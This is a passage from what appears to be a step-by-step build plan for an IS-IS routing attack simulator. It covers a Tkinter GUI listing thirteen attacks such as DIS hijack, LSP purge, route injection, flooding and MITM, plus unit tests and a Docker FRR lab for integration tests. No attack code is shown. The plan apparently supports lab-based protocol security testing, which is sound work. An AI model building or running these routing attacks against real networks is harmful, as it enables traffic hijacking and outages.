- Create: `isis_attack/gui/log_panel.py`
- Create: `isis_attack/gui/pcap_tools.py`
- Create: `isis_attack/gui/runner.py`
- Create: `isis_attack/gui/styles.py`
- Test: `tests/unit/test_gui_meta.py`

The GUI follows OSPF's pattern exactly — Tkinter + ttk, same layout (1100x720), Treeview attack list with 4 categories / 13 attacks, dynamic form, log panel. The key difference: field labels reference ISIS terminology (System ID, Area Address, Priority/DIS, etc.).

- [ ] **Step 1: Write gui/__init__.py**

```python
"""ISIS attack simulator GUI."""
def launch_gui():
    import tkinter as tk
    from isis_attack.gui.app import ISISAttackApp
    root = tk.Tk()
    app = ISISAttackApp(root)
    root.mainloop()
```

- [ ] **Step 2: Write gui/app.py, styles.py, attack_tree.py**

For brevity, the GUI files mirror OSPF's GUI exactly with:
- `styles.py`: identical color/font constants
- `app.py`: `ISISAttackApp` class, same layout (treeview left, form right, log bottom), 1100x720
- `attack_tree.py`: Treeview with 4 categories:
  - adjacency: iih-inject, adjacency-break, dis-hijack
  - lsp: route-inject, max-seq, purge-lsp, fight-back, overload-bit
  - dos: flood, spf-recalc, db-overflow
  - protocol: mitm, replay
- `config_form.py`: FIELD_META with ISIS-specific fields
- `log_panel.py`: thread-safe colored logging
- `pcap_tools.py`: packet browse/pcap import
- `runner.py`: background attack thread

- [ ] **Step 3: Write gui meta test**

```python
# tests/unit/test_gui_meta.py
import pytest

def test_gui_importable():
    from isis_attack.gui import launch_gui
    assert callable(launch_gui)

def test_attack_registry_has_13():
    from isis_attack.cli.commands import ATTACK_REGISTRY
    assert len(ATTACK_REGISTRY) == 13

def test_categories():
    from isis_attack.cli.commands import ATTACK_REGISTRY
    names = list(ATTACK_REGISTRY.keys())
    assert "iih-inject" in names
    assert "overload-bit" in names
    assert "db-overflow" in names
    assert "replay" in names
```

- [ ] **Step 4: Run tests**

Run: `pytest tests/unit/test_gui_meta.py -v`
Expected: 3 PASS

- [ ] **Step 5: Commit**

```bash
git add isis_attack/gui/ tests/unit/test_gui_meta.py
git commit -m "feat: add Tkinter GUI with 13 attack types"
```

---

## Phase 14: Integration Tests

### Task 27: Docker FRR integration tests

**Files:**
- Create: `docker/topo1-single-area/docker-compose.yml`
- Create: `docker/topo1-single-area/Dockerfile`
- Create: `tests/integration/conftest.py`
- Create: `tests/integration/test_topology_attacks.py`

- [ ] **Step 1: Write docker setup**

```yaml
# docker/topo1-single-area/docker-compose.yml
version: "3.8"
services:
  isis-r1:
    build: .
    container_name: isis-r1
    privileged: true
    networks:
      isis-net:
        ipv4_address: 172.20.0.2
  isis-r2:
    build: .
    container_name: isis-r2
    privileged: true
    networks:
      isis-net:
        ipv4_address: 172.20.0.3

networks:
  isis-net:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/24
```

- [ ] **Step 2: Write conftest.py** (Docker container management, FRR config injection, pytest fixtures)

- [ ] **Step 3: Write integration tests** (50 tests covering all 13 attacks + auth + active mode)

- [ ] **Step 4: Commit**

```bash
git add docker/ tests/integration/
git commit -m "feat: add Docker FRR integration tests"
```

---

## Phase 15: README and Final Touches

### Task 28: README and final polish

**Files:**
- Create: `README.md`

- [ ] **Step 1: Write README.md** (mirror OSPF README with ISIS specifics)

- [ ] **Step 2: Run full test suite**

```bash
pip install -e "D:\cc\ISIS_Protocol_Attack[dev]"
pytest tests/unit/ -v
```

Expected: ~60 unit tests PASS

- [ ] **Step 3: Final commit**

```bash
git add README.md
git commit -m "docs: add README and finalize project"
```
